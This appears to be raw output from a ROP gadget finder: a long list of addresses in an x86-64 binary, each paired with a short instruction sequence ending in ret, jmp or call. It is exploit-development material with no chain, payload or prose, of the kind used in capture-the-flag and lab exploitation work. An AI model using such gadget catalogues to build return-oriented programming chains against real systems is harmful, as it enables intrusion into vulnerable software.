0x000000000047d5a0 : jb 0x47d570 ; cli ; jmp rdx
0x000000000040865f : jbe 0x4086b2 ; add esp, 0x10 ; pop rbx ; pop rbp ; pop r12 ; ret
0x000000000041d756 : jbe 0x41d795 ; add rax, rdi ; ret
0x000000000041d766 : jbe 0x41d797 ; lea rax, [rdi + rax + 0x10] ; ret
0x000000000041d776 : jbe 0x41d797 ; lea rax, [rdi + rax + 0x20] ; ret
0x000000000041d786 : jbe 0x41d797 ; lea rax, [rdi + rax + 0x30] ; ret
0x000000000041db97 : jbe 0x41dc08 ; add rax, rdi ; vzeroupper ; ret
0x0000000000456110 : jbe 0x4560e8 ; mov qword ptr [rdi], rsi ; ret
0x000000000045c360 : jbe 0x45c338 ; mov qword ptr [rdi], rsi ; ret
0x000000000046d0bf : jbe 0x46d0cb ; ret
0x000000000047d548 : jbe 0x47d513 ; cli ; jmp rsi
0x000000000040040e : je 0x400414 ; call rax
0x00000000004009f9 : je 0x400a10 ; pop rbp ; mov edi, 0x6a2bd0 ; jmp rax
0x0000000000400a3b : je 0x400a50 ; pop rbp ; mov edi, 0x6a2bd0 ; jmp rax
0x00000000004051fe : je 0x40520e ; add dword ptr [rax - 9], ecx ; ror byte ptr [rax + 1], 1 ; ret
0x00000000004057e8 : je 0x4057e4 ; add byte ptr [rax], al ; nop dword ptr [rax] ; ret
0x000000000040a064 : je 0x40a08f ; cmp byte ptr [rax + 0x29], cl ; ret
0x000000000040a448 : je 0x40a44f ; ret
0x000000000040d785 : je 0x40d793 ; ret
0x000000000040f80f : je 0x40f857 ; mov qword ptr [rsi], rcx ; ret
0x0000000000415132 : je 0x41515e ; sub byte ptr [rax - 0x77], cl ; out dx, eax ; call rax
0x00000000004155c3 : je 0x4155d6 ; lea rax, [rdx - 0x10] ; ret
0x0000000000415bad : je 0x415be0 ; mov qword ptr [rbx], rax ; xor eax, eax ; pop rbx ; ret
0x00000000004161f9 : je 0x416205 ; add byte ptr [rax - 0x77], cl ; ret 0x8b48
0x00000000004167c2 : je 0x41678d ; ret
0x000000000041c543 : je 0x41c50d ; lea r10, [r10 + r9] ; jmp r10
0x000000000041d42a : je 0x41d432 ; xchg eax, edx ; sub eax, edx ; ret
0x000000000041d65c : je 0x41d6b3 ; xor byte ptr [rsi + 0xf], ah ; xlatb ; ret
0x000000000041d93a : je 0x41d991 ; xor byte ptr [rsi + 0xf], ah ; xlatb ; ret
0x000000000041e305 : je 0x41e317 ; sbb eax, eax ; or eax, 1 ; ret
0x000000000041f927 : je 0x41f931 ; add byte ptr [rax], al ; xor eax, eax ; ret
0x000000000042f363 : je 0x42f32d ; lea r10, [r10 + r9] ; jmp r10
0x0000000000430ef3 : je 0x430ebd ; lea r10, [r10 + r9] ; jmp r10
0x00000000004326d1 : je 0x4326e9 ; bsf eax, eax ; lea rax, [rdi + rax] ; ret
0x0000000000432cf4 : je 0x432cfe ; bsf eax, edx ; ret
0x0000000000432cf4 : je 0x432cff ; bsf eax, edx ; ret
0x0000000000432d9d : je 0x432db5 ; bsf rax, rdx ; ret
0x0000000000432d9d : je 0x432db6 ; bsf rax, rdx ; ret
0x0000000000432d3c : je 0x432dc9 ; bsf rax, rdx ; ret
0x0000000000439373 : je 0x439394 ; ror byte ptr [rdi], 1 ; adc dword ptr [rdi + rdx - 0x40], edi ; ret
0x000000000043a99e : je 0x43a9ac ; xor eax, eax ; ret
0x000000000043a999 : je 0x43a9b9 ; cmp eax, 2 ; je 0x43a9b1 ; xor eax, eax ; ret
0x000000000043a9ed : je 0x43a9d3 ; ret
0x000000000043adeb : je 0x43ae00 ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x000000000043c0a7 : je 0x43c0d2 ; adc byte ptr [rdi], cl ; xchg eax, esp ; ret 0x2044
0x000000000043c60a : je 0x43c611 ; ret
0x000000000043da29 : je 0x43da2e ; ret
0x000000000043da8d : je 0x43da92 ; ret
0x000000000043e1dc : je 0x43e1ef ; lea rdi, [rcx + rax + 0x20] ; jmp rdx
0x000000000043ee98 : je 0x43eea3 ; ret
0x000000000043eeb4 : je 0x43eec9 ; mov dword ptr [rip + 0x261c1c], edx ; pop rbx ; ret
0x00000000004428f7 : je 0x442926 ; mov rdi, qword ptr [rsp + 0x38] ; call r14
0x0000000000442b40 : je 0x442b6f ; mov rdi, qword ptr [rsp + 0x38] ; call r14
0x0000000000443152 : je 0x443181 ; mov rdi, qword ptr [rsp + 0x38] ; call r14
0x00000000004433cf : je 0x4433fe ; mov rdi, qword ptr [rsp + 0x38] ; call r14
0x00000000004439e0 : je 0x443a0f ; push rax ; mov rdi, qword ptr [rsp + 0x48] ; call r15
0x0000000000443d1e : je 0x443d4d ; push rax ; mov rdi, qword ptr [rsp + 0x48] ; call r15
0x00000000004445d2 : je 0x444601 ; mov rdi, qword ptr [rsp + 0x38] ; call r15
0x0000000000445247 : je 0x445276 ; mov rdi, qword ptr [rsp + 0x40] ; call r15
0x0000000000446130 : je 0x44615f ; push rax ; mov rdi, qword ptr [rsp + 0x48] ; call r14
0x0000000000446317 : je 0x446345 ; adc byte ptr [rcx - 0x77], cl ; add ecx, dword ptr [rax - 0x77] ; ret 0x3b89
0x00000000004464a2 : je 0x4464d1 ; push rax ; mov rdi, qword ptr [rsp + 0x48] ; call r15
0x0000000000446f78 : je 0x446fa7 ; push rax ; mov rdi, qword ptr [rsp + 0x48] ; call r14
0x000000000044716b : je 0x447199 ; adc byte ptr [rcx - 0x77], cl ; add ecx, dword ptr [rax - 0x77] ; ret 0x3b89
0x00000000004472f2 : je 0x447321 ; push rax ; mov rdi, qword ptr [rsp + 0x48] ; call r15
0x00000000004484c7 : je 0x4484d3 ; ret
0x00000000004484c2 : je 0x4484d8 ; cmp esi, 3 ; je 0x4484d8 ; ret
0x0000000000448ce2 : je 0x448ce8 ; call rsi
0x0000000000448ddd : je 0x448de3 ; call rax
0x0000000000449d4b : je 0x449d51 ; call rax
0x000000000044a30e : je 0x44a31b ; ret
0x000000000044a907 : je 0x44a932 ; sbb byte ptr [rax + 1], cl ; ret
0x000000000044ab4f : je 0x44ab7c ; adc byte ptr [rax - 0x77], cl ; out dx, eax ; call r12
0x0000000000454bf4 : je 0x454bff ; add byte ptr [rdi + rcx + 0x45], cl ; ret 0xf4c
0x0000000000454bf3 : je 0x454c00 ; add byte ptr [rdi + rcx + 0x45], cl ; ret 0xf4c
0x000000000045db86 : je 0x45dbd6 ; add esp, 0x20 ; pop rbx ; ret
0x000000000045db85 : je 0x45dbd7 ; add esp, 0x20 ; pop rbx ; ret
0x000000000045dfec : je 0x45dff3 ; ret
0x000000000045e006 : je 0x45e013 ; pop rbx ; ret
0x000000000045e55a : je 0x45e584 ; or al, 0xeb ; ret 0x5590
0x000000000046003c : je 0x460065 ; bsf rax, rdx ; ret
0x000000000046003c : je 0x460066 ; bsf rax, rdx ; ret
0x000000000045ffcc : je 0x460079 ; bsf rax, rdx ; ret
0x00000000004604db : je 0x4604e3 ; ret
0x0000000000460aae : je 0x460add ; sbb byte ptr [rax - 0x77], cl ; out dx, eax ; mov r9, r14 ; call rbx
0x0000000000460bd8 : je 0x460be5 ; test edx, edx ; jne 0x460bd7 ; ret
0x0000000000461079 : je 0x461099 ; mov cl, dl ; and cl, 0xf ; je 0x4610a9 ; ret
0x0000000000461080 : je 0x4610a2 ; ret
0x0000000000461095 : je 0x4610b6 ; add rax, 2 ; ret
0x0000000000462339 : je 0x462324 ; xor eax, eax ; ret
0x0000000000465eb5 : je 0x465ee4 ; sub byte ptr [rax - 0x3f], cl ; clc ; add dl, byte ptr [rax - 0x77] ; ret 0xc389
0x000000000046a1e8 : je 0x46a1f6 ; mov qword ptr [rsi], rdi ; mov rax, r8 ; pop rbx ; ret
0x000000000046c96a : je 0x46c8c8 ; sub eax, edx ; ret
0x000000000046fb92 : je 0x46fba6 ; pop rbx ; pop rbp ; pop r12 ; ret
0x0000000000470088 : je 0x4700b3 ; or byte ptr [rax + 1], cl ; ret
0x0000000000471701 : je 0x471715 ; mov rax, qword ptr [rbx] ; add rax, qword ptr [rdx + 8] ; call rax
0x0000000000471ba0 : je 0x471be5 ; shl rdx, 5 ; add rdx, rax ; jmp 0x471bbc
0x0000000000472666 : je 0x472673 ; ret
0x0000000000474e9d : je 0x474ec8 ; adc byte ptr [rcx - 0x77], cl ; ret
0x0000000000477438 : je 0x477422 ; add rsp, 0x18 ; ret
0x0000000000477421 : je 0x477446 ; add rsp, 0x18 ; ret
0x00000000004774c8 : je 0x4774a8 ; ret
0x0000000000477509 : je 0x477516 ; mov qword ptr [rdi + rsi*8], rdx ; ret
0x00000000004797fa : je 0x479803 ; ret
0x0000000000479833 : je 0x479844 ; mov eax, dword ptr [rdi] ; test eax, eax ; jne 0x479849 ; ret
0x000000000047990a : je 0x479913 ; ret
0x000000000047a6d6 : je 0x47a6dc ; call rax
0x000000000047a993 : je 0x47a99e ; call rax
0x000000000047cf88 : je 0x47cf2d ; cli ; jmp rsp
0x000000000047d490 : je 0x47d45a ; cli ; jmp rsp
0x0000000000490288 : je 0x490253 ; xor al, 0xd8 ; ret
0x00000000004904c7 : je 0x4904c4 ; jmp 0x49049e
0x0000000000490fc2 : je 0x490f8a ; ret 0xacfc
0x0000000000496c5c : je 0x496c48 ; idiv edi ; ret 2
0x000000000049772c : je 0x497759 ; cli ; jmp rbx
0x000000000049bcfc : je 0x49bcf3 ; cld ; call qword ptr [rcx]
0x000000000049c57c : je 0x49c5a1 ; std ; call rdi
0x000000000040d782 : jg 0x40d7c2 ; add byte ptr [rcx + rcx - 0xd], dh ; ret
0x0000000000421e29 : jg 0x421e7c ; ret
0x0000000000421eaf : jg 0x421efa ; ret
0x0000000000422029 : jg 0x42207c ; ret 0x894c
0x00000000004220af : jg 0x4220fa ; ret 0x894c
0x00000000004247f9 : jg 0x42484c ; ret
0x000000000042487f : jg 0x4248ca ; ret
0x00000000004249f9 : jg 0x424a4c ; ret 0x894c
0x0000000000424a7f : jg 0x424aca ; ret 0x894c
0x0000000000426de8 : jg 0x426e39 ; loope 0x426de7 ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x0000000000426e5f : jg 0x426eaa ; ret 0xff2
0x0000000000426e78 : jg 0x426ec9 ; loop 0x426e77 ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x0000000000426eef : jg 0x426f3a ; ret
0x0000000000426f08 : jg 0x426f59 ; jrcxz 0x426f07 ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x0000000000426f98 : jg 0x426fe9 ; in al, 0xf3 ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x0000000000427018 : jg 0x427069 ; in eax, 0xf3 ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x0000000000427098 : jg 0x4270e9 ; out 0xf3, al ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x0000000000427118 : jg 0x427169 ; out 0xf3, eax ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x0000000000427198 : jg 0x4271e9 ; call 0x4fc1819a
0x0000000000427218 : jg 0x427269 ; jmp 0x4fc1821a
0x0000000000427398 : jg 0x4273e9 ; in al, dx ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x0000000000427418 : jg 0x427469 ; in eax, dx ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x00000000004274a8 : jg 0x4274f9 ; out dx, al ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x0000000000427528 : jg 0x427579 ; out dx, eax ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x000000000042759c : jg 0x4275a7 ; ret
0x00000000004275f6 : jg 0x427609 ; ret
0x00000000004275f1 : jg 0x427641 ; psllq mm1, qword ptr [rdi] ; jg 0x42760e ; ret
0x0000000000427666 : jg 0x427679 ; ret
0x00000000004276d6 : jg 0x4276e9 ; ret
0x00000000004276d1 : jg 0x427721 ; or eax, 0xf7f0ff3 ; ret
0x0000000000427746 : jg 0x427759 ; ret
0x0000000000427741 : jg 0x427791 ; or al, 0xf3 ; movq qword ptr [rdi], mm1 ; ret
0x00000000004277b6 : jg 0x4277c9 ; ret
0x00000000004277b1 : jg 0x427801 ; or esi, ebx ; movq qword ptr [rdi], mm1 ; ret
0x0000000000427826 : jg 0x427839 ; ret
0x0000000000427821 : jg 0x427871 ; or dh, bl ; movq qword ptr [rdi], mm1 ; ret
0x0000000000427896 : jg 0x4278a9 ; ret
0x0000000000427891 : jg 0x4278e1 ; or ebx, esi ; movq qword ptr [rdi], mm1 ; ret
0x0000000000427906 : jg 0x427919 ; ret
0x0000000000427901 : jg 0x427951 ; or bl, dh ; movq qword ptr [rdi], mm1 ; ret
0x0000000000427976 : jg 0x427989 ; ret
0x00000000004279e6 : jg 0x4279f9 ; ret
0x0000000000427a56 : jg 0x427a69 ; ret
0x0000000000427a51 : jg 0x427aa1 ; add eax, 0xf7f0ff3 ; ret
0x0000000000427ac6 : jg 0x427ad9 ; ret
0x0000000000427ac1 : jg 0x427b11 ; add al, 0xf3 ; movq qword ptr [rdi], mm1 ; ret
0x0000000000427b36 : jg 0x427b49 ; ret
0x0000000000427b31 : jg 0x427b81 ; add esi, ebx ; movq qword ptr [rdi], mm1 ; ret
0x0000000000427ba6 : jg 0x427bb9 ; ret
0x0000000000427ba1 : jg 0x427bf1 ; add dh, bl ; movq qword ptr [rdi], mm1 ; ret
0x0000000000427c16 : jg 0x427c29 ; ret
0x0000000000427c11 : jg 0x427c61 ; add ebx, esi ; movq qword ptr [rdi], mm1 ; ret
0x0000000000429908 : jg 0x429959 ; loope 0x429907 ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x000000000042997f : jg 0x4299ca ; ret 0xff2
0x0000000000429998 : jg 0x4299e9 ; loop 0x429997 ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x0000000000429a0f : jg 0x429a5a ; ret
0x0000000000429a28 : jg 0x429a79 ; jrcxz 0x429a27 ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x0000000000429ab8 : jg 0x429b09 ; in al, 0xf3 ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x0000000000429b38 : jg 0x429b89 ; in eax, 0xf3 ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x0000000000429bb8 : jg 0x429c09 ; out 0xf3, al ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x0000000000429c38 : jg 0x429c89 ; out 0xf3, eax ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x0000000000429cb8 : jg 0x429d09 ; call 0x4fc1acba
0x0000000000429d38 : jg 0x429d89 ; jmp 0x4fc1ad3a
0x0000000000429eb8 : jg 0x429f09 ; in al, dx ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x0000000000429f38 : jg 0x429f89 ; in eax, dx ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x0000000000429fc8 : jg 0x42a019 ; out dx, al ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x000000000042a048 : jg 0x42a099 ; out dx, eax ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x000000000042a0bc : jg 0x42a0c7 ; ret
0x000000000042a116 : jg 0x42a129 ; ret
0x000000000042a111 : jg 0x42a161 ; psllq mm1, qword ptr [rdi] ; jg 0x42a12e ; ret
0x000000000042a186 : jg 0x42a199 ; ret
0x000000000042a1f6 : jg 0x42a209 ; ret
0x000000000042a1f1 : jg 0x42a241 ; or eax, 0xf7f0ff3 ; ret
0x000000000042a266 : jg 0x42a279 ; ret
0x000000000042a261 : jg 0x42a2b1 ; or al, 0xf3 ; movq qword ptr [rdi], mm1 ; ret
0x000000000042a2d6 : jg 0x42a2e9 ; ret
0x000000000042a2d1 : jg 0x42a321 ; or esi, ebx ; movq qword ptr [rdi], mm1 ; ret
0x000000000042a346 : jg 0x42a359 ; ret
0x000000000042a341 : jg 0x42a391 ; or dh, bl ; movq qword ptr [rdi], mm1 ; ret
0x000000000042a3b6 : jg 0x42a3c9 ; ret
0x000000000042a3b1 : jg 0x42a401 ; or ebx, esi ; movq qword ptr [rdi], mm1 ; ret
0x000000000042a426 : jg 0x42a439 ; ret
0x000000000042a421 : jg 0x42a471 ; or bl, dh ; movq qword ptr [rdi], mm1 ; ret
0x000000000042a496 : jg 0x42a4a9 ; ret
0x000000000042a506 : jg 0x42a519 ; ret
0x000000000042a576 : jg 0x42a589 ; ret
0x000000000042a571 : jg 0x42a5c1 ; add eax, 0xf7f0ff3 ; ret
0x000000000042a5e6 : jg 0x42a5f9 ; ret
0x000000000042a5e1 : jg 0x42a631 ; add al, 0xf3 ; movq qword ptr [rdi], mm1 ; ret
0x000000000042a656 : jg 0x42a669 ; ret
0x000000000042a651 : jg 0x42a6a1 ; add esi, ebx ; movq qword ptr [rdi], mm1 ; ret
0x000000000042a6c6 : jg 0x42a6d9 ; ret
0x000000000042a6c1 : jg 0x42a711 ; add dh, bl ; movq qword ptr [rdi], mm1 ; ret
0x000000000042a736 : jg 0x42a749 ; ret
0x000000000042a731 : jg 0x42a781 ; add ebx, esi ; movq qword ptr [rdi], mm1 ; ret
0x000000000042a894 : jg 0x42a8a5 ; vmovdqu ymmword ptr [r9 - 0x20], ymm1 ; ret
0x000000000042a8a8 : jg 0x42a8b9 ; vmovdqu xmmword ptr [r9 - 0x10], xmm1 ; ret
0x000000000042ad1a : jg 0x42ad16 ; ret
0x00000000004365c6 : jg 0x4365d1 ; ret
0x00000000004365d6 : jg 0x4365e4 ; mov byte ptr [rdi + 0x10], dh ; ret
0x00000000004365ea : jg 0x4365f9 ; mov word ptr [rdi + 0x10], cx ; ret
0x0000000000436609 : jg 0x436617 ; mov dword ptr [rdi + 0xf], ecx ; ret
0x0000000000436619 : jg 0x436627 ; mov dword ptr [rdi + 0x10], ecx ; ret
0x0000000000436629 : jg 0x43663a ; mov dword ptr [rdi + 0x10], ecx ; mov byte ptr [rdi + 0x14], dh ; ret
0x000000000043664a : jg 0x436659 ; mov qword ptr [rdi + 0xe], rcx ; ret
0x000000000043666a : jg 0x436679 ; mov qword ptr [rdi + 0xf], rcx ; ret
0x000000000043668a : jg 0x436699 ; mov qword ptr [rdi + 0x10], rcx ; ret
0x00000000004366aa : jg 0x4366bc ; mov qword ptr [rdi + 0x10], rcx ; mov byte ptr [rdi + 0x18], dh ; ret
0x00000000004366ed : jg 0x4366ff ; mov qword ptr [rdi + 0x10], rdx ; mov dword ptr [rdi + 0x17], ecx ; ret
0x000000000043670d : jg 0x43671f ; mov qword ptr [rdi + 0x10], rdx ; mov dword ptr [rdi + 0x18], ecx ; ret
0x000000000043672b : jg 0x43673b ; movdqu xmmword ptr [rdi + 0xd], xmm2 ; ret
0x000000000043674b : jg 0x43675b ; movdqu xmmword ptr [rdi + 0xe], xmm2 ; ret
0x000000000043676b : jg 0x43677b ; movdqu xmmword ptr [rdi + 0xf], xmm2 ; ret
0x000000000043678b : jg 0x43679b ; movdqu xmmword ptr [rdi + 0x10], xmm2 ; ret
0x0000000000436c56 : jg 0x436c65 ; lea rax, [rdi + 0xf] ; ret
0x0000000000436c66 : jg 0x436c78 ; mov byte ptr [rdi + 0x10], dh ; lea rax, [rdi + 0x10] ; ret
0x0000000000436c99 : jg 0x436cab ; mov dword ptr [rdi + 0xf], ecx ; lea rax, [rdi + 0x12] ; ret
0x0000000000436cb9 : jg 0x436ccb ; mov dword ptr [rdi + 0x10], ecx ; lea rax, [rdi + 0x13] ; ret
0x0000000000436ddf : jg 0x436e3f ; or eax, 0x1c478d48 ; ret
0x0000000000439027 : jg 0x439037 ; vmovdqu xmmword ptr [rsi - 0x10], xmm0 ; ret
0x000000000043901d : jg 0x43903d ; vmovdqu ymmword ptr [rsi - 0x20], ymm2 ; ret
0x00000000004394b4 : jg 0x4394ec ; movups xmmword ptr [r11], xmm8 ; ret
0x0000000000439582 : jg 0x4395ba ; movups xmmword ptr [r11], xmm8 ; ret
0x000000000043965a : jg 0x43966b ; vmovdqu xmmword ptr [rdi + rdx - 0x10], xmm1 ; ret
0x00000000004397eb : jg 0x439815 ; vzeroupper ; ret
0x0000000000439892 : jg 0x43989c ; vzeroupper ; ret
0x000000000043991e : jg 0x439948 ; vzeroupper ; ret
0x00000000004399ae : jg 0x4399b8 ; vzeroupper ; ret
0x0000000000439ac2 : jg 0x439ad3 ; vmovdqu xmmword ptr [rdi + rdx - 0x10], xmm1 ; ret
0x0000000000439ca6 : jg 0x439cd0 ; vzeroupper ; ret
0x0000000000439ca5 : jg 0x439cd1 ; vzeroupper ; ret
0x0000000000439d6c : jg 0x439d76 ; vzeroupper ; ret
0x0000000000439d6b : jg 0x439d77 ; vzeroupper ; ret
0x0000000000439e3f : jg 0x439e69 ; vzeroupper ; ret
0x0000000000439e3e : jg 0x439e6a ; vzeroupper ; ret
0x0000000000439f12 : jg 0x439f1c ; vzeroupper ; ret
0x0000000000439f11 : jg 0x439f1d ; vzeroupper ; ret
0x0000000000439f7c : jg 0x439f87 ; ret
0x0000000000439fcc : jg 0x439fd7 ; ret
0x000000000043a0d4 : jg 0x43a0e2 ; vzeroupper ; ret
0x000000000043a124 : jg 0x43a132 ; vzeroupper ; ret
0x000000000043a1e3 : jg 0x43a1f1 ; vzeroupper ; ret
0x000000000043a261 : jg 0x43a26f ; vzeroupper ; ret
0x000000000043a260 : jg 0x43a270 ; vzeroupper ; ret
0x000000000043a2c1 : jg 0x43a2cf ; vzeroupper ; ret
0x000000000043a2c0 : jg 0x43a2d0 ; vzeroupper ; ret
0x000000000043a3ab : jg 0x43a3b9 ; vzeroupper ; ret
0x000000000043a3b9 : jg 0x43a3c7 ; vzeroupper ; ret
0x000000000043a410 : jg 0x43a44d ; ret 0x2b77
0x000000000043a52b : jg 0x43a4f8 ; mov eax, 0x80 ; pop rbx ; ret
0x000000000043a587 : jg 0x43a585 ; int1 ; mov eax, eax ; ret
0x000000000043b23d : jg 0x43b297 ; cld ; dec dword ptr [rax - 0x77] ; ret
0x000000000043bc73 : jg 0x43bc7d ; add byte ptr [rax], al ; add rsp, 0x68 ; ret
0x000000000044d63a : jg 0x44d653 ; test byte ptr [rbp - 0x7c000012], ah ; ret
0x00000000004541ab : jg 0x4541b6 ; add byte ptr [rsi + 0xf], ah ; outsd dx, dword ptr [rsi] ; ret 0xb9e8
0x0000000000456f4a : jg 0x456f63 ; test byte ptr [rip - 0x7c000003], cl ; ret
0x00000000004582b2 : jg 0x4582cb ; test byte ptr [rbp - 0x7c000017], ah ; ret
0x00000000004583c8 : jg 0x4583e1 ; test byte ptr [rdi - 0x7c000018], cl ; ret
0x000000000046ae77 : jg 0x46ae89 ; test rdi, rdi ; jne 0x46ae58 ; ret
0x0000000000474ce8 : jg 0x474cf2 ; add byte ptr [rcx - 0x77], cl ; ror byte ptr [rax - 0x77], 1 ; ret 0x3575
0x00000000004067a6 : jge 0x4067af ; mov rax, qword ptr [rsp + 8] ; call rax
0x00000000004139e6 : jge 0x4139f3 ; add al, ch ; xchg eax, edx ; ret 0xffff
0x00000000004139e5 : jge 0x4139f4 ; add al, ch ; xchg eax, edx ; ret 0xffff
0x000000000043cc97 : jge 0x43cc52 ; mov rdi, r13 ; mov rsi, qword ptr [rax] ; call r14
0x0000000000477882 : jge 0x47787f ; leave ; ret
0x0000000000477a00 : jge 0x477a03 ; mov rbp, qword ptr [rbp] ; mov rsp, rcx ; ret
0x0000000000477b4c : jge 0x477b49 ; leave ; ret
0x0000000000477b98 : jge 0x477b9b ; mov rbp, qword ptr [rbp] ; mov rsp, rcx ; ret
0x0000000000477d27 : jge 0x477d2a ; mov rbp, qword ptr [rbp] ; mov rsp, rcx ; ret
0x0000000000477e87 : jge 0x477e84 ; leave ; ret
0x0000000000477ed8 : jge 0x477edb ; mov rbp, qword ptr [rbp] ; mov rsp, rcx ; ret
0x000000000049bcf9 : jge 0x49bd01 ; add byte ptr [rdx + rsi*8 - 4], dh ; call qword ptr [rcx]
0x00000000004010df : jl 0x40110d ; or al, 0x48 ; mov eax, dword ptr [rsp + 0x18] ; call rax
0x0000000000405156 : jl 0x405167 ; add dword ptr [rax - 9], ecx ; ror byte ptr [rax + 1], 1 ; ret
0x0000000000405bbd : jl 0x405be8 ; or byte ptr [rcx - 0x77], cl ; ret 0x8b4c
0x000000000042a814 : jl 0x42a863 ; adc dword ptr [rcx - 1], edi ; ret
0x000000000042a850 : jl 0x42a89f ; adc dword ptr [rcx - 1], ebx ; ret
0x000000000042aa4e : jl 0x42aa9d ; adc dword ptr [rcx - 1], edi ; ret
0x000000000042abb5 : jl 0x42ac04 ; adc dword ptr [rcx + 7], edi ; ret
0x000000000042ad17 : jl 0x42ad66 ; adc dword ptr [rdi - 8], edi ; ret
0x0000000000438fdc : jl 0x43902b ; adc dword ptr [rsi - 1], edx ; ret
0x0000000000438ffd : jl 0x43904c ; adc dword ptr [rsi - 1], edx ; ret
0x0000000000439010 : jl 0x43905f ; adc dword ptr [rsi - 1], edx ; ret
0x00000000004390e5 : jl 0x439134 ; adc dword ptr [rsi - 1], edx ; ret
0x000000000043913d : jl 0x43918c ; adc dword ptr [rsi + 3], edx ; ret
0x00000000004391da : jl 0x439229 ; adc dword ptr [rsi + 7], edx ; ret
0x0000000000439b90 : jl 0x439baf ; cld ; vzeroupper ; ret
0x000000000043cada : jl 0x43cb08 ; adc byte ptr [rax - 0x75], cl ; and al, 0x18 ; call rax
0x00000000004439e5 : jl 0x443a0f ; call r15
0x0000000000443ba0 : jl 0x443bce ; adc byte ptr [rcx - 0x77], cl ; add ecx, dword ptr [rax - 0x77] ; ret 0x3389
0x0000000000443d23 : jl 0x443d4d ; call r15
0x00000000004441af : jl 0x4441dd ; cmp byte ptr [rax - 0x75], cl ; and al, 0x18 ; call rax
0x0000000000444d8f : jl 0x444dbd ; mov rax, qword ptr [rsp + 0x20] ; call rax
0x000000000044524c : jl 0x445276 ; call r15
0x0000000000446135 : jl 0x44615f ; call r14
0x00000000004464a7 : jl 0x4464d1 ; call r15
0x0000000000446f7d : jl 0x446fa7 ; call r14
0x00000000004472f7 : jl 0x447321 ; call r15
0x000000000044aad6 : jl 0x44ab01 ; and byte ptr [rax + 0x39], cl ; ret 0x8d48
0x0000000000456321 : jl 0x45634c ; adc byte ptr [rax - 0x7d], cl ; ret
0x000000000045f67b : jl 0x45f6a6 ; adc byte ptr [rax - 0x77], cl ; ret 0x8949
0x0000000000467175 : jl 0x4671a0 ; or byte ptr [rax - 0x7d], cl ; ret 0x101
0x000000000046d895 : jl 0x46d8c3 ; sbb byte ptr [rax - 0x75], cl ; push rsp ; and al, 0x10 ; call rdx
0x0000000000497664 : jl 0x497688 ; cli ; call rsp
0x000000000049d1d1 : jl 0x49d1d2 ; call qword ptr [rdx]
0x0000000000432d3e : jle 0x432d47 ; add byte ptr [rax], al ; bsf rax, rdx ; ret
0x0000000000432d3e : jle 0x432d48 ; add byte ptr [rax], al ; bsf rax, rdx ; ret
0x0000000000438eb1 : jle 0x438eed ; movsxd rax, ecx ; ret
0x0000000000448512 : jle 0x448525 ; sub eax, 1 ; mov dword ptr [rbx + 8], eax ; pop rbx ; ret
0x000000000045b7c3 : jle 0x45b750 ; ret 0x349
0x000000000045dfe9 : jle 0x45e021 ; add byte ptr [rdx + rax - 0xd], dh ; ret
0x0000000000479802 : jle 0x4797b7 ; and al, byte ptr [rax] ; add dword ptr [rax], eax ; add byte ptr [rax], al ; ret
0x0000000000497371 : jle 0x49736e ; call qword ptr [rax]
0x0000000000403d4b : jmp 0x403d11
0x00000000004067c2 : jmp 0x406787
0x0000000000406941 : jmp 0x406907
0x000000000040bc3a : jmp 0x40bbf2
0x000000000040bf82 : jmp 0x40bf48
0x0000000000413412 : jmp 0x40f6a2
0x0000000000413491 : jmp 0x41348b
0x0000000000413741 : jmp 0x413707
0x0000000000416279 : jmp 0x41623f
0x0000000000432514 : jmp 0x4324da
0x0000000000432668 : jmp 0x43262d
0x000000000043272c : jmp 0x4326f2
0x0000000000432878 : jmp 0x43283d
0x0000000000438b9e : jmp 0x438b64
0x0000000000438c6f : jmp 0x438c35
0x0000000000438cde : jmp 0x438ca4
0x000000000043b583 : jmp 0x43b411
0x000000000043b901 : jmp 0x43b85e
0x000000000043bcca : jmp 0x43bc67
0x000000000043bddb : jmp 0x43bda0
0x000000000043d703 : jmp 0x43d667
0x000000000044346a : jmp 0x443224
0x00000000004433ff : jmp 0x44327a
0x0000000000447fa6 : jmp 0x447f6b
0x000000000045803f : jmp 0x458005
0x00000000004580da : jmp 0x4580df
0x000000000045cecb : jmp 0x45ce90
0x000000000045e906 : jmp 0x45e8cf
0x000000000045ee23 : jmp 0x45ede9
0x0000000000461dd1 : jmp 0x461d23
0x000000000046eff2 : jmp 0x46f044
0x0000000000472b42 : jmp 0x472b94
0x0000000000478c4e : jmp 0x478c64
0x000000000047a563 : jmp 0x47a529
0x000000000048f78a : jmp 0x48f7c9
0x00000000004904c9 : jmp 0x49049c
0x00000000004914c0 : jmp 0x491454
0x00000000004914bf : jmp 0x491455
0x000000000042721a : jmp 0x4fc18218
0x0000000000427219 : jmp 0x4fc18219
0x0000000000429d3a : jmp 0x4fc1ad38
0x0000000000429d39 : jmp 0x4fc1ad39
0x000000000046df61 : jmp 0xffffffffc35668b6
0x00000000004582b6 : jmp 0xffffffffc3c982be
0x0000000000467569 : jmp 0xffffffffeb0837f9
0x0000000000461b53 : jmp 0xfffffffff677dde3
0x000000000047cdd7 : jmp qword ptr [rax + 0x10fffaa8]
0x000000000047c683 : jmp qword ptr [rax - 0x2f00066c]
0x000000000047d883 : jmp qword ptr [rax - 0x3f000472]
0x00000000004069c1 : jmp qword ptr [rax]
0x00000000004649cb : jmp qword ptr [rbx]
0x000000000047b1ab : jmp qword ptr [rcx]
